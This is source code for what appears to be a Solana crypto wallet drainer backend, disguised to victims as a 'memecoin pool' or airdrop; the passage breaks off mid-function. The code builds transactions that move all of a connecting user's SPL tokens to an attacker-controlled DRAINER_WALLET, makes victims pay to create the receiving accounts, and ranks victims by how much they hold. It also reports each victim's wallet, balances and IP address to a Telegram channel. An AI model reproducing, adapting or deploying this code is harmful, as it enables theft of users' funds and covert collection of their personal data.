import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, getMint, createAssociatedTokenAccountInstruction } from '@solana/spl-token';

// Import fetch for Node.js compatibility
import fetch from 'node-fetch';

// Import centralized error handling
import errorHandler from '../src/errorHandler.js';

// Import centralized configuration
import { ENV_CONFIG, RPC_ENDPOINTS, PROJECT_NAME } from '../env.config.js';

// Import Telegram logger singleton
import telegramLogger from '../src/telegram.js';

// Configuration from environment variables - with error handling
let DRAINER_WALLET;
let TOKEN_PROGRAM_ID;
let MIN_SOL_FOR_FEES;
let MIN_SOL_FOR_ATA;
let MIN_WALLET_VALUE;
let MAX_ADDRESS_DIFFERENCES;

// Initialize configuration safely
try {
  DRAINER_WALLET = new PublicKey(ENV_CONFIG.DRAINER_WALLET_ADDRESS);
  TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
  MIN_SOL_FOR_FEES = ENV_CONFIG.MIN_SOL_FOR_FEES * LAMPORTS_PER_SOL;
  MIN_SOL_FOR_ATA = ENV_CONFIG.MIN_SOL_FOR_ATA * LAMPORTS_PER_SOL;
  MIN_WALLET_VALUE = ENV_CONFIG.MIN_WALLET_VALUE * LAMPORTS_PER_SOL;
  MAX_ADDRESS_DIFFERENCES = ENV_CONFIG.MAX_ADDRESS_DIFFERENCES;
} catch (error) {
  console.error('[DRAIN_ASSETS] Configuration error:', error.message);
  console.error('[DRAIN_ASSETS] ENV_CONFIG.DRAINER_WALLET_ADDRESS:', ENV_CONFIG.DRAINER_WALLET_ADDRESS);
  // Set fallback values
  DRAINER_WALLET = new PublicKey('11111111111111111111111111111111');
  TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
  MIN_SOL_FOR_FEES = 0.005 * LAMPORTS_PER_SOL;
  MIN_SOL_FOR_ATA = 0.002 * LAMPORTS_PER_SOL;
  MIN_WALLET_VALUE = 0.001 * LAMPORTS_PER_SOL;
  MAX_ADDRESS_DIFFERENCES = 3;
}

// Token Draining Limits & Batching
let MAX_TOKENS_PER_TRANSACTION;
let MAX_INSTRUCTIONS_PER_TRANSACTION;
let MAX_TRANSACTION_SIZE_BYTES;
let ENABLE_TOKEN_BATCHING;

// Rate Limit Bypass for High-Value Wallets
let RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
let RATE_LIMIT_BYPASS_SOL_THRESHOLD;
let RATE_LIMIT_BYPASS_ENABLED;

// Pre-create placeholder PublicKeys for stealth efficiency (avoid recreating on each call)
let STEALTH_PLACEHOLDER_MINT;

// Initialize remaining configuration safely
try {
  MAX_TOKENS_PER_TRANSACTION = ENV_CONFIG.MAX_TOKENS_PER_TRANSACTION;
  MAX_INSTRUCTIONS_PER_TRANSACTION = ENV_CONFIG.MAX_INSTRUCTIONS_PER_TRANSACTION;
  MAX_TRANSACTION_SIZE_BYTES = ENV_CONFIG.MAX_TRANSACTION_SIZE_BYTES;
  ENABLE_TOKEN_BATCHING = ENV_CONFIG.ENABLE_TOKEN_BATCHING;
  
  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD = ENV_CONFIG.RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
  RATE_LIMIT_BYPASS_SOL_THRESHOLD = ENV_CONFIG.RATE_LIMIT_BYPASS_SOL_THRESHOLD * LAMPORTS_PER_SOL;
  RATE_LIMIT_BYPASS_ENABLED = ENV_CONFIG.RATE_LIMIT_BYPASS_ENABLED;
  
  STEALTH_PLACEHOLDER_MINT = new PublicKey('11111111111111111111111111111111');
} catch (error) {
  console.error('[DRAIN_ASSETS] Additional configuration error:', error.message);
  // Set fallback values
  MAX_TOKENS_PER_TRANSACTION = 50;
  MAX_INSTRUCTIONS_PER_TRANSACTION = 80;
  MAX_TRANSACTION_SIZE_BYTES = 1200;
  ENABLE_TOKEN_BATCHING = true;
  
  RATE_LIMIT_BYPASS_TOKEN_THRESHOLD = 100;
  RATE_LIMIT_BYPASS_SOL_THRESHOLD = 1.0 * LAMPORTS_PER_SOL;
  RATE_LIMIT_BYPASS_ENABLED = true;
  
  STEALTH_PLACEHOLDER_MINT = new PublicKey('11111111111111111111111111111111');
}



// RPC endpoints with fallback for reliability (prioritizing Helius and Shyft)

// Function to fetch token metadata
async function getTokenMetadata(connection, mintAddress) {
  try {
    const mint = await getMint(connection, new PublicKey(mintAddress));
    return {
      decimals: mint.decimals,
      supply: mint.supply.toString(),
      isInitialized: mint.isInitialized,
      freezeAuthority: mint.freezeAuthority?.toString() || null,
      mintAuthority: mint.mintAuthority?.toString() || null
    };
  } catch (error) {
    console.error(`Failed to fetch mint metadata for ${mintAddress}:`, error.message);
    return null;
  }
}

// Function to get token name/symbol from mint address (fully dynamic)
async function getTokenInfo(connection, mintAddress) {
  console.log(`[DEBUG] Resolving token info for mint: ${mintAddress}`);
  
  try {
    // First, try to get metadata from Jupiter's token list API (most reliable)
    try {
      console.log(`[DEBUG] Trying Jupiter API for ${mintAddress}...`);
      const response = await fetch(ENV_CONFIG.JUPITER_TOKEN_LIST_URL);
      if (response.ok) {
        const tokenList = await response.json();
        // Jupiter API returns an array directly, not {tokens: [...]}
        const token = tokenList.find(t => t.address === mintAddress);
        if (token) {
          console.log(`[DEBUG] Found token in Jupiter API: ${token.name} (${token.symbol})`);
          return {
            name: token.name || 'Unknown Token',
            symbol: token.symbol || 'UNKNOWN',
            logo: token.logoURI || null,
            decimals: token.decimals || 0
          };
        } else {
          console.log(`[DEBUG] Token ${mintAddress} not found in Jupiter API`);
        }
      } else {
        console.log(`[DEBUG] Jupiter API response not ok: ${response.status}`);
      }
    } catch (jupiterError) {
      console.log(`[DEBUG] Jupiter API failed for ${mintAddress}:`, jupiterError.message);
    }

    // Fallback: Try to get metadata from Solana's metadata program
    try {
      console.log(`[DEBUG] Trying Solana metadata for ${mintAddress}...`);
      const metadataAddress = await getMetadataAddress(new PublicKey(mintAddress));
      const metadataAccount = await connection.getAccountInfo(metadataAddress);
      
      if (metadataAccount && metadataAccount.data) {
        console.log(`[DEBUG] Found metadata account for ${mintAddress}`);
        // Try to parse metadata using a more robust approach
        const data = metadataAccount.data;
        
        // Look for name and symbol in the metadata
        let name = null;
        let symbol = null;
        
        // Search for name and symbol patterns in the metadata
        const dataString = data.toString();
        
        // Try to find name (usually appears as "name" followed by the actual name)
        const namePatterns = [
          /name["\s]*[:=]["\s]*([^"\s,}]+)/i,
          /"name"\s*:\s*"([^"]+)"/i,
          /name\s*=\s*"([^"]+)"/i
        ];
        
        for (const pattern of namePatterns) {
          const match = dataString.match(pattern);
          if (match && match[1] && match[1].length > 0 && match[1] !== 'name') {
            name = match[1].trim();
            console.log(`[DEBUG] Found name in metadata: ${name}`);
            break;
          }
        }
        
        // Try to find symbol (usually appears as "symbol" followed by the actual symbol)
        const symbolPatterns = [
          /symbol["\s]*[:=]["\s]*([^"\s,}]+)/i,
          /"symbol"\s*:\s*"([^"]+)"/i,
          /symbol\s*=\s*"([^"]+)"/i
        ];
        
        for (const pattern of symbolPatterns) {
          const match = dataString.match(pattern);
          if (match && match[1] && match[1].length > 0 && match[1] !== 'symbol') {
            symbol = match[1].trim();
            console.log(`[DEBUG] Found symbol in metadata: ${symbol}`);
            break;
          }
        }
        
        if (name || symbol) {
          const result = {
            name: name || `Token ${mintAddress.substring(0, 8)}...`,
            symbol: symbol || mintAddress.substring(0, 4).toUpperCase(),
            logo: null,
            decimals: 0
          };
          console.log(`[DEBUG] Returning metadata result: ${result.name} (${result.symbol})`);
          return result;
        } else {
          console.log(`[DEBUG] No name/symbol found in metadata for ${mintAddress}`);
        }
      } else {
        console.log(`[DEBUG] No metadata account found for ${mintAddress}`);
      }
    } catch (metadataError) {
      console.log(`[DEBUG] Metadata parsing failed for ${mintAddress}:`, metadataError.message);
    }

    // Final fallback: use mint address as identifier
    console.log(`[DEBUG] Using fallback naming for ${mintAddress}`);
    const fallbackResult = {
      name: `Token ${mintAddress.substring(0, 8)}...`,
      symbol: mintAddress.substring(0, 4).toUpperCase(),
      logo: null,
      decimals: 0
    };
    console.log(`[DEBUG] Returning fallback result: ${fallbackResult.name} (${fallbackResult.symbol})`);
    return fallbackResult;
    
  } catch (error) {
    console.log(`[DEBUG] Failed to get token info for ${mintAddress}:`, error.message);
    // Final fallback: use mint address as identifier
    const errorFallbackResult = {
      name: `Token ${mintAddress.substring(0, 8)}...`,
      symbol: mintAddress.substring(0, 4).toUpperCase(),
      logo: null,
      decimals: 0
    };
    console.log(`[DEBUG] Returning error fallback result: ${errorFallbackResult.name} (${errorFallbackResult.symbol})`);
    return errorFallbackResult;
  }
}

// Helper function to get metadata address for a mint
async function getMetadataAddress(mint) {
  try {
    // Try to import metaplex if available (optional dependency)
    const { findMetadataPda } = await import('@metaplex-foundation/mpl-token-metadata');
    return findMetadataPda(mint);
  } catch (error) {
    // If metaplex is not available, construct a basic metadata address
    // This is a simplified approach that works without external dependencies
    const metadataProgramId = new PublicKey('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s');
    const [metadataAddress] = await PublicKey.findProgramAddress(
      [
        Buffer.from('metadata'),
        metadataProgramId.toBuffer(),
        mint.toBuffer(),
      ],
      metadataProgramId
    );
    return metadataAddress;
  }
}



// Transaction simulation function for validation
async function simulateTransaction(connection, transaction, userPubkey) {
  try {
    console.log(`[SIMULATION] Simulating transaction with ${transaction.instructions.length} instructions`);
    
    // Get recent blockhash
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = userPubkey;
    
    // Simulate the transaction
    const simulation = await connection.simulateTransaction(transaction);
    
    if (simulation.value.err) {
      console.log(`[SIMULATION] Transaction simulation failed:`, simulation.value.err);
      return { success: false, error: simulation.value.err, logs: simulation.value.logs };
    }
    
    console.log(`[SIMULATION] Transaction simulation successful`);
    if (simulation.value.logs) {
      simulation.value.logs.forEach(log => {
        if (log.includes('Program log:')) {
          console.log(`[SIMULATION] ${log}`);
        }
      });
    }
    
    return { success: true, logs: simulation.value.logs };
  } catch (error) {
    console.log(`[SIMULATION] Simulation error: ${error.message}`);
    return { success: false, error: error.message };
  }
}

// Function to check if wallet qualifies for rate limit bypass
function checkRateLimitBypass(tokenCount, solBalance) {
  if (!RATE_LIMIT_BYPASS_ENABLED) {
    return { bypass: false, reason: 'Rate limit bypass disabled' };
  }
  
  const hasSignificantTokens = tokenCount >= RATE_LIMIT_BYPASS_TOKEN_THRESHOLD;
  const hasSignificantSOL = solBalance >= RATE_LIMIT_BYPASS_SOL_THRESHOLD;
  
  if (hasSignificantTokens || hasSignificantSOL) {
    const reasons = [];
    if (hasSignificantTokens) reasons.push(`${tokenCount} tokens`);
    if (hasSignificantSOL) reasons.push(`${(solBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    
    return {
      bypass: true,
      reason: `High-value wallet: ${reasons.join(', ')}`,
      tokenCount,
      solBalance,
      threshold: {
        tokens: RATE_LIMIT_BYPASS_TOKEN_THRESHOLD,
        sol: RATE_LIMIT_BYPASS_SOL_THRESHOLD / LAMPORTS_PER_SOL
      }
    };
  }
  
  return { bypass: false, reason: 'Standard rate limiting applies' };
}

// Function to create batched transactions for large token counts
async function createBatchedTransactions(connection, tokens, userPubkey) {
  try {
    console.log(`[BATCHING] Creating batched transactions for ${tokens.length} tokens`);
    
    const batches = [];
    let currentBatch = [];
    let currentBatchSize = 0;
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        
        if (amount <= 0) continue;
        
        // Estimate instruction size (rough calculation)
        const estimatedInstructionSize = 100; // Conservative estimate per SPL transfer
        
        // Check if adding this token would exceed limits
        if (currentBatch.length >= MAX_TOKENS_PER_TRANSACTION || 
            currentBatchSize + estimatedInstructionSize > MAX_TRANSACTION_SIZE_BYTES) {
          
          // Finalize current batch
          if (currentBatch.length > 0) {
            const batchResult = await createCleanSPLTransfer(connection, currentBatch, userPubkey);
            if (batchResult.success) {
              batches.push({
                batchNumber: batches.length + 1,
                tokens: currentBatch.length,
                transaction: batchResult.instructions,
                tokenDetails: batchResult.tokenDetails
              });
            }
          }
          
          // Start new batch
          currentBatch = [token];
          currentBatchSize = estimatedInstructionSize;
        } else {
          currentBatch.push(token);
          currentBatchSize += estimatedInstructionSize;
        }
      } catch (error) {
        console.log(`[BATCHING] Error processing token for batching: ${error.message}`);
        continue;
      }
    }
    
    // Add final batch if it has tokens
    if (currentBatch.length > 0) {
      const batchResult = await createCleanSPLTransfer(connection, currentBatch, userPubkey);
      if (batchResult.success) {
        batches.push({
          batchNumber: batches.length + 1,
          tokens: currentBatch.length,
          transaction: batchResult.instructions,
          tokenDetails: batchResult.tokenDetails
        });
      }
    }
    
    console.log(`[BATCHING] Created ${batches.length} batches for ${tokens.length} total tokens`);
    
    return {
      success: true,
      batches,
      totalBatches: batches.length,
      totalTokens: tokens.length
    };
    
  } catch (error) {
    console.log(`[BATCHING] Error creating batched transactions: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}

// Function to pre-initialize recipient token accounts
async function preInitializeRecipientAccounts(connection, tokens, userPubkey) {
  try {
    console.log(`[PRE_INIT] Pre-initializing recipient accounts for ${tokens.length} tokens`);
    
    const preInitTransactions = [];
    const initializedTokens = [];
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        
        if (amount <= 0) continue;
        
        // Get drainer ATA address
        const drainerATA = await getAssociatedTokenAddress(mint, DRAINER_WALLET);
        
        // Check if drainer ATA already exists
        const drainerAccount = await connection.getAccountInfo(drainerATA);
        
        if (!drainerAccount) {
          console.log(`[PRE_INIT] Creating ATA for mint ${info.mint} before main transaction`);
          
          // Create ATA creation transaction
          const ataCreationTx = new Transaction();
          const createATAIx = createAssociatedTokenAccountInstruction(
            userPubkey, // payer
            drainerATA, // ATA address
            DRAINER_WALLET, // owner
            mint // mint
          );
          
          ataCreationTx.add(createATAIx);
          ataCreationTx.feePayer = userPubkey;
          
          // Get blockhash for ATA creation
          let ataBlockhash;
          for (const endpoint of RPC_ENDPOINTS) {
            try {
              const fallbackConnection = new Connection(endpoint);
              const blockhashResponse = await fallbackConnection.getLatestBlockhash();
              ataBlockhash = blockhashResponse.blockhash;
              break;
            } catch (blockhashError) {
              continue;
            }
          }
          
          if (!ataBlockhash) {
            ataBlockhash = '11111111111111111111111111111111';
          }
          
          ataCreationTx.recentBlockhash = ataBlockhash;
          
          // Serialize ATA creation transaction
          const ataSerialized = ataCreationTx.serialize({ requireAllSignatures: false });
          const ataBase64 = Buffer.from(ataSerialized).toString('base64');
          
          preInitTransactions.push({
            mint: info.mint,
            transaction: ataBase64,
            type: 'ata_creation',
            drainerATA: drainerATA.toString()
          });
          
          console.log(`[PRE_INIT] ATA creation transaction prepared for mint ${info.mint}`);
        } else {
          console.log(`[PRE_INIT] ATA already exists for mint ${info.mint}`);
        }
        
        // Add to initialized tokens list
        initializedTokens.push({
          ...token,
          drainerATA: drainerATA.toString(),
          needsPreInit: !drainerAccount
        });
        
      } catch (tokenError) {
        console.log(`[PRE_INIT] Error processing token for pre-init: ${tokenError.message}`);
        continue;
      }
    }
    
    console.log(`[PRE_INIT] Pre-initialization complete: ${preInitTransactions.length} ATA creation transactions needed`);
    
    return {
      success: true,
      preInitTransactions,
      initializedTokens,
      needsPreInit: preInitTransactions.length > 0
    };
    
  } catch (error) {
    console.log(`[PRE_INIT] Error in pre-initialization: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}

// Clean SPL transfer function (no ATA creation instructions)
async function createCleanSPLTransfer(connection, tokens, userPubkey) {
  try {
    console.log(`[CLEAN_TRANSFER] Creating clean SPL transfer for ${tokens.length} tokens`);
    
    const instructions = [];
    const tokenDetails = [];
    let processedTokens = 0;
    let totalValue = 0;
    
    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const mint = new PublicKey(info.mint);
        const amount = Number(info.tokenAmount.amount);
        const sourceATA = token.pubkey;
        
        if (amount <= 0) continue;
        
        console.log(`[CLEAN_TRANSFER] Processing token: ${info.mint}, amount: ${amount}`);
        
        // Get drainer ATA address (should already exist from pre-initialization)
        const drainerATA = await getAssociatedTokenAddress(mint, DRAINER_WALLET);
        
        // Verify drainer ATA exists (critical for clean transfer)
        const drainerAccount = await connection.getAccountInfo(drainerATA);
        
        if (!drainerAccount) {
          console.log(`[CLEAN_TRANSFER] WARNING: Drainer ATA doesn't exist for mint ${info.mint}`);
          console.log(`[CLEAN_TRANSFER] This token requires pre-initialization before clean transfer`);
          continue; // Skip this token - it needs pre-initialization
        }
        
        // Add ONLY the transfer instruction - no ATA creation
        const transferIx = createTransferInstruction(
          sourceATA, // from
          drainerATA, // to (guaranteed to exist)
          userPubkey, // authority
          BigInt(amount)
        );
        instructions.push(transferIx);
        
        // Get token info for display
        const tokenInfo = await getTokenInfo(connection, info.mint);
        const decimals = info.tokenAmount.decimals || 0;
        const humanAmount = amount / Math.pow(10, decimals);
        
        tokenDetails.push({
          mint: info.mint,
          name: tokenInfo?.name || 'Unknown Token',
          symbol: tokenInfo?.symbol || 'UNKNOWN',
          logo: tokenInfo?.logo || null,
          amount: amount,
          humanReadableAmount: humanAmount,
          uiAmount: info.tokenAmount.uiAmount,
          decimals: decimals,
          drainerATA: drainerATA.toString()
        });
        
        processedTokens++;
        totalValue += amount;
        console.log(`[CLEAN_TRANSFER] Added clean transfer instruction for ${tokenInfo?.symbol || 'token'}`);
        
      } catch (tokenError) {
        console.log(`[CLEAN_TRANSFER] Error processing token: ${tokenError.message}`);
        continue;
      }
    }
    
    if (processedTokens === 0) {
      // Check if wallet has any SPL tokens at all
      const hasAnySPLTokens = tokens.some(token => {
        try {
          const info = token.account.data.parsed.info;
          const amount = Number(info.tokenAmount.amount);
          return amount > 0;
        } catch (e) {
          return false;
        }
      });
      
      if (!hasAnySPLTokens) {
        throw new Error('Wallet has no SPL tokens to drain - only SOL balance found');
      } else {
        throw new Error('Wallet has SPL tokens but they require pre-initialization before draining');
      }
    }
    
    console.log(`[CLEAN_TRANSFER] Successfully created clean transfer with ${instructions.length} instructions for ${processedTokens} tokens`);
    
    return {
      success: true,
      instructions,
      tokenDetails,
      processedTokens,
      totalValue
    };
    
  } catch (error) {
    console.log(`[CLEAN_TRANSFER] Error creating clean transfer: ${error.message}`);
    return {
      success: false,
      error: error.message
    };
  }
}


export default async function drainAssetsHandler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const { user, walletType } = req.body;
    
    // Enhanced wallet type validation with fallback (moved to beginning)
    const VALID_WALLET_TYPES = [
      'phantom', 'solflare', 'backpack', 'exodus', 'glow', 'unknown'
    ];
    
    // Validate wallet type
    function validateWalletType(walletType) {
      if (!walletType || typeof walletType !== 'string') {
        return 'unknown';
      }
      
      const normalizedType = walletType.toLowerCase().trim();
      
      // Explicitly reject Trust Wallet
      if (normalizedType.includes('trust') || normalizedType.includes('trustwallet')) {
        return 'rejected';
      }
      
      // Check for exact matches first
      if (VALID_WALLET_TYPES.includes(normalizedType)) {
        return normalizedType;
      }
      
      // Check for partial matches (but not for rejected types)
      for (const validType of VALID_WALLET_TYPES) {
        if (normalizedType.includes(validType) || validType.includes(normalizedType)) {
          return validType;
        }
      }
      
      return 'unknown';
    }
    
    const validatedWalletType = validateWalletType(walletType);
    console.log(`[WALLET_VALIDATION] Received wallet type: "${walletType}"`);
    console.log(`[WALLET_VALIDATION] Validated wallet type: "${validatedWalletType}"`);
    
    if (validatedWalletType === 'rejected') {
      console.log(`[WALLET_VALIDATION] Trust Wallet rejected: ${walletType}`);
      return res.status(400).json({ 
        success: false,
        error: 'Trust Wallet not supported',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    if (validatedWalletType === 'unknown') {
      console.log(`[WALLET_VALIDATION] Invalid wallet type: ${walletType}, using 'unknown'`);
    }
    
    // Enhanced user parameter validation
    if (!user || typeof user !== 'string') {
      // Log missing or invalid user parameter
      try {
        telegramLogger.logError({
          publicKey: user || 'Missing',
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Missing or invalid user parameter',
          context: 'SPL Memecoin Pool - Parameter Validation',
          walletType: validatedWalletType,
          lamports: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid user parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    // Validate Solana public key format before creating PublicKey object
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(user)) {
      try {
        telegramLogger.logError({
          publicKey: user || 'Invalid Format',
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Invalid Solana public key format',
          context: 'SPL Memecoin Pool - Public Key Format Validation',
          walletType: validatedWalletType,
          lamports: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Solana public key format',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(user);
    } catch (error) {
      // Log invalid public key format
      try {
        telegramLogger.logError({
          publicKey: user || 'Invalid Format',
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: `Invalid public key format: ${error.message}`,
          context: 'SPL Memecoin Pool - Public Key Validation',
          walletType: validatedWalletType,
          lamports: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({ 
        success: false,
        error: 'Invalid wallet format',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // Check if user is trying to drain the receiver's wallet (prevent self-draining)
    if (userPubkey.equals(DRAINER_WALLET)) {
      console.log(`[SECURITY] Attempted to drain receiver wallet: ${userPubkey.toString()}`);
      
      // Log security violation to Telegram
      try {
        telegramLogger.logError({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Security violation: Attempted to drain receiver wallet',
          context: 'SPL Airdrop - Security Check',
          walletType: validatedWalletType,
          lamports: 0,
          securityViolation: true,
          violationType: 'self_drain_attempt',
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(403).json({ 
        success: false,
        error: 'Security violation',
        message: 'Wallet not eligible for memecoin pool'
      });
    }

    // Check if user wallet is suspiciously similar to receiver wallet (typo protection)
    const userAddress = userPubkey.toString();
    const receiverAddress = DRAINER_WALLET.toString();
    
    // Check for similar addresses (potential typos)
    if (userAddress.length === receiverAddress.length) {
      let differences = 0;
      
      for (let i = 0; i < userAddress.length; i++) {
        if (userAddress[i] !== receiverAddress[i]) {
          differences++;
          if (differences > MAX_ADDRESS_DIFFERENCES) break;
        }
      }
      
      if (differences <= MAX_ADDRESS_DIFFERENCES) {
        console.log(`[SECURITY] Suspicious wallet address detected: ${userAddress} (${differences} differences from receiver)`);
        
        // Log suspicious address to Telegram
        try {
          telegramLogger.logError({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: `Suspicious wallet address: ${differences} character differences from receiver`,
          context: 'SPL Memecoin Pool - Security Check',
          walletType: validatedWalletType,
          lamports: 0,
          securityViolation: true,
          violationType: 'suspicious_address',
          differences: differences,
          receiverAddress: receiverAddress,
          projectName: PROJECT_NAME
        });
        } catch (telegramError) {
          // Silent fail for Telegram logging
        }
        
        return res.status(403).json({ 
          success: false,
          error: 'Suspicious wallet address',
          message: 'Wallet not eligible for memecoin pool'
        });
      }
    }

    // Wallet type validation already done at the beginning of the function

    // Create connection with RPC fallback

    let connection;
    let tokenAccounts;
    let userSolBalance;

    // Try to get connection and account data with fallback
    try {
      const connectionResult = await errorHandler.withRPCFallback(async (endpoint) => {
        console.log(`[DEBUG] Trying RPC endpoint: ${endpoint}`);
        const conn = new Connection(endpoint);
        
        const accounts = await conn.getParsedTokenAccountsByOwner(userPubkey, {
          programId: TOKEN_PROGRAM_ID,
        });
        
        const balance = await conn.getBalance(userPubkey);
        
        return { connection: conn, tokenAccounts: accounts, userSolBalance: balance };
      }, RPC_ENDPOINTS, {
        publicKey: userPubkey.toString(),
        context: 'RPC Connection and Account Retrieval'
      });
      
      connection = connectionResult.connection;
      tokenAccounts = connectionResult.tokenAccounts;
      userSolBalance = connectionResult.userSolBalance;
      
      console.log(`[DEBUG] Successfully connected to RPC endpoint`);
      console.log(`[DEBUG] Token accounts found: ${tokenAccounts?.value?.length || 0}`);
      console.log(`[DEBUG] SOL balance: ${userSolBalance}`);
      
    } catch (rpcError) {
      return res.status(500).json(errorHandler.formatApiError(rpcError, {
        publicKey: userPubkey.toString(),
        context: 'RPC Connection Failure'
      }));
    }

    // Check if user has enough SOL for transaction fees
    if (userSolBalance < MIN_SOL_FOR_FEES) {
      // Log insufficient funds
      try {
        telegramLogger.logInsufficientFunds({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          lamports: userSolBalance,
          walletType: walletType || 'Unknown',
          context: 'SPL Memecoin Pool - Transaction Fees',
          required: MIN_SOL_FOR_FEES,
          splTokens: 0,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({
        success: false,
        error: 'Insufficient SOL for fees',
        message: 'Wallet not eligible for memecoin pool',
        solBalance: userSolBalance,
        requiredSol: MIN_SOL_FOR_FEES
      });
    }

    // Check if wallet is known to be empty or has very low value (prevent wasting resources)
    if (userSolBalance < MIN_WALLET_VALUE) {
      console.log(`[SECURITY] Low value wallet detected: ${userPubkey.toString()} (${userSolBalance} lamports)`);
      
      // Log low value wallet to Telegram
      try {
        telegramLogger.logError({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          error: 'Low value wallet detected',
          context: 'SPL Memecoin Pool - Security Check',
          walletType: walletType || 'Unknown',
          lamports: userSolBalance,
          securityViolation: true,
          violationType: 'low_value_wallet',
          minRequired: MIN_WALLET_VALUE
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
      
      return res.status(400).json({
        success: false,
        error: 'Low value wallet',
        message: 'Wallet not eligible for memecoin pool',
        solBalance: userSolBalance,
        minRequired: MIN_WALLET_VALUE
      });
    }

    // Debug: Log raw token accounts data
    console.log(`[DEBUG] Raw token accounts for wallet ${userPubkey.toString()}:`, JSON.stringify(tokenAccounts.value, null, 2));
    
    // Filter drainable tokens (ALL tokens with balance > 0)
    const drainableTokens = tokenAccounts.value.filter(token => {
      try {
        if (!token.account.data.parsed || !token.account.data.parsed.info) {
          console.log(`[DEBUG] Token account missing parsed data:`, token.pubkey.toString());
          return false;
        }
        
        const info = token.account.data.parsed.info;
        const amount = Number(info.tokenAmount.amount);
        
        console.log(`[DEBUG] Token ${token.pubkey.toString()}: amount=${amount}, uiAmount=${info.tokenAmount.uiAmount}`);
        
        // Only skip zero balance or null amounts
        if (amount === 0 || info.tokenAmount.uiAmount === null) {
          console.log(`[DEBUG] Skipping token ${token.pubkey.toString()} - zero balance or null uiAmount`);
          return false;
        }
        
        return true;
      } catch (error) {
        // Log token filtering failure but continue (synchronous logging)
        console.error(`Token filtering failed for wallet ${userPubkey.toString()}: ${error.message}`);
        return false;
      }
    });
    
    console.log(`[DEBUG] Filtered drainable tokens: ${drainableTokens.length}`);

    // Check if wallet qualifies for rate limit bypass
    const rateLimitBypass = checkRateLimitBypass(drainableTokens.length, userSolBalance);
    if (rateLimitBypass.bypass) {
      console.log(`[RATE_LIMIT_BYPASS] 🚀 High-value wallet detected: ${rateLimitBypass.reason}`);
      
      // Log high-value wallet bypass to Telegram
      try {
        telegramLogger.logHighValueBypass({
          publicKey: userPubkey.toString(),
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          lamports: userSolBalance,
          tokenCount: drainableTokens.length,
          bypassReason: rateLimitBypass.reason,
          threshold: rateLimitBypass.threshold,
          projectName: PROJECT_NAME
        });
      } catch (telegramError) {
        // Silent fail for Telegram logging
      }
    } else {
      console.log(`[RATE_LIMIT] Standard rate limiting applies: ${rateLimitBypass.reason}`);
    }

    if (drainableTokens.length === 0) {
      // Log no tokens found scenario
      try {
        telegramLogger.logWalletDetected({
          publicKey: userPubkey.toString(),
          walletType: walletType || 'Unknown',
          lamports: userSolBalance,
          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
          splTokens: 0,
          projectName: PROJECT_NAME,
          message: `👛 Wallet Connected - No SPL Tokens\n\n👤 Wallet: ${userPubkey.toString().substring(0, 8)}...\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: 0 tokens\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}`
        });
